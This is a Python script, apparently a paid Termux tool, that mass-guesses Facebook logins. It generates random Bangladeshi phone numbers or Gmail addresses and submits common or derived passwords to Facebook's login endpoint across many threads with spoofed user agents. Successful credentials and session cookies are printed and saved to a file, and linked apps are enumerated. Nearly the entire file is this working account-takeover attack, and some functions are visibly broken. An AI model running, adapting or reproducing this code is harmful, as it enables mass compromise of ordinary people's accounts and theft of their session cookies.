import os,sys,time,json,random,re,string,platform,base64,uuid,zlib
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def main():
    os.system('clear')
    jalan(logo)
    print('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m RANDOM NUMBER CRACK [BD]')
    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m RANDOM E-MAIL CRACK [COMING SOON]')
    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m RANDOM NUMBER CRACK [COMING SOON]')
    jalan('\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')
    jalan('\033[1;91m[\033[1;92m5\033[1;91m]\033[1;92m MY GITHUB ACCOUNT')
    jalan('\033[1;91m[\033[1;92m6\033[1;91m]\033[1;92m MY YOUTUBE CHANNEL')
    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mCHOOSE : ')
    if opt == '1':
        FIRE()
    if opt == '2':
    	exit("THIS SERVICE IS NOT AVAILABLE NOW!")
    if opt == '3':
        return opt
    if opt == '4':
        os.system(f'xdg-open https://www.facebook.com/TurRealabbu1?mibextid=ZbWKwL')
        return opt
    if opt == '5':
        os.system('xdg-open https://www.facebook.com/TurRealabbu1?mibextid=ZbWKwL');time.sleep(1)
        return opt
    if opt == '6':
        os.system(f'xdg-open https://www.facebook.com/TurRealabbu1?mibextid=ZbWKwL')
        os.system('Exit')
        return None
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  YOUR ACTIVE APPS     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100032901442053', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
update = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = "KHALID=="+id+bxd+xp
myweb2 = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
logo = ("""
\033[0;95m     ██ ██ ███████  █████  ███    ██ 
\033[0;95m     ██ ██ ██      ██   ██ ████   ██ 
\033[0;95m     ██ ██ ███████ ███████ ██ ██  ██ 
\033[0;95m██   ██ ██      ██ ██   ██ ██  ██ ██ 
\033[0;95m █████  ██ ███████ ██   ██ ██   ████ 
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] STATUS :\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m HAMIM UDDIN JISAN  
\033[1;32m[-] WHATSAPP  :\033[1;32m +8801814649133
\033[1;32m[-] GITHUB    :\033[1;32m X1X4D-2-0 
\033[1;32m[-] FACEBOOK  :\033[1;32m Itz Jisan Xhowdhury 
\033[1;32m[-] NETWORK   :\033[1;32m DATA & WI FI
\033[1;32m[-] TOOLS   :\033[1;32m RANDOM CLONING
\033[1;32m[-] VERSION  :\033[1;32m 3.2
\033[1;92m══════════════════════════════════════════""")
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get("https://github.com/X1X4D-2-0/CONTROL/blob/main/CONTROL.txt").text
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        os.system('')
                        os.system('')
                        os.system('')
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        main()
                else:
                        os.system("clear");print(logo)
                        print(f"Your Device License Key Is Not Approved")
                        print(50*"-")
                        print(f"Key : {bumper}")
                        print(50*"-")
                        print(f" 15-Days Price : 350")
                        print(f" 1-Month Price : 500")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+8801838873419?text={bumper}")
                        qsbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')

def rrrr():
        if bumper in myweb2:
                pass
        else:
                qsbuy()
def xchker():
    pass
    qsbuy()
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo=("""\033[92;1m
\033[0;95m     ██ ██ ███████  █████  ███    ██ 
\033[0;95m     ██ ██ ██      ██   ██ ████   ██ 
\033[0;95m     ██ ██ ███████ ███████ ██ ██  ██ 
\033[0;95m██   ██ ██      ██ ██   ██ ██  ██ ██ 
\033[0;95m █████  ██ ███████ ██   ██ ██   ████ 
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] STATUS :\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m HAMIM UDDIN JISAN  
\033[1;32m[-] WHATSAPP  :\033[1;32m +8801814649133
\033[1;32m[-] GITHUB    :\033[1;32m X1X4D-2-0 
\033[1;32m[-] FACEBOOK  :\033[1;32m Itz Jisan Xhowdhury 
\033[1;32m[-] NETWORK   :\033[1;32m DATA & WI FI
\033[1;32m[-] TOOLS   :\033[1;32m RANDOM CLONING
\033[1;32m[-] VERSION  :\033[1;32m 3.2
\033[1;92m══════════════════════════════════════════""")

loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        os.system(f'xdg-open https://www.facebook.com/profile.php?id=100090884797469&mibextid=ZbWKwL')
        print(f"");time.sleep(2)
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
ugen=[ ]
for ua in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14','15'])
    c='Nokia C22 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
    ugen.append(ug)
    
# APK CHECK
def emailbal():

    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan(" тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР")
    M= '@gmail.com' 
    AH = '@yahoo.com'
    DI  = '@hotmail.com'
    mgmail = random.choice([M])        
    rk1 = '.'
    rk2 = ''
    rk3 = ' '
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}тЦа{x}] Choose : ')
    os.system('clear')
    jalan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    jalan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    jalan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \x1b[1;91m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    os.system("clear")
    jalan(logo)
    passx = 0
    HamiiID = []
    jalan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=150) as manshera:
        clear()
        tl = str(len(user))
        print(xd*55)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m YOUR FIRST & LAST NAME: \033[1;90m'+fastname+lasttname)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS    : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        print(xd*55)
        for love in user:
            mahdiuser=fastname+code+lasttname+love
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire',fastname+'123',lasttname+'123']
            uid = mahdiuser+'@gmail.com'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР")
def pak():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    jalan(" тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР")

    code = input(f' [{xr}тЦа{x}] PUT YOUR SIM CODE : ')
    os.system('clear')
    jalan(logo)
    os.system("clear")
    bal = input("ENTER YOUR NAME : ")
    
    os.system("clear")
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    jalan(logo)
    passx = 0
    HamiiID = []
    jalan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=150) as manshera:
        clear()
        tl = str(len(user))
        print(xd*55)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS    : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        print(xd*55)
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','Bangladesh']
            uid = code+love
            for Mahdi in HamiiID:
                pwx.append(Mahdi)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР")
def FIRE():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    xd="\033[1;92m="
    print(xd*55)
    print(f' [{xr}✔{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
    print(xd*55)
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}✔{x}]\033[0;92m EXAMPLE : \x1b[1;91m10000, \x1b[38;5;208m20000, \033[0;92m50000 \n\033[1;92m══════════════════════════════════════════════════════ \n\033[0;97m[{xr}✔{x}] \033[0;92mENTER CLONING LIMIT:\033[0;93m '))
    os.system("clear")

    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    bal = input("ENTER YOUR NAME : ")
    
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(xd*55)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;92m'+code)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS    : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        print(xd*55)
        os.system(f'xdg-open https://www.facebook.com/profile.php?id=100090884797469&mibextid=ZbWKwL')
        print(f"");time.sleep(2)
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                idf = re.findall('c_user=(.*);xs', coki)[0]
                bal=tahunng(idf)
                print('\r\r\033[1;32m[JISAN-OK[🏵️]  ' +uid+ ' | ' +ps+ '\033[1;91m <==>' +bal+    '  \n\033[1;32m[‎‎🍪]\033[1;32mCOOKIE = \033[1;36m'+coki+  ' \n\033[1;36m[📲]AGENT =\033[1;32m'+pro+'  \033[1;32m')
                cek_apk(session,coki)
                open('/sdcard/JISAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}JISAN[💥]{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

qsbuy()
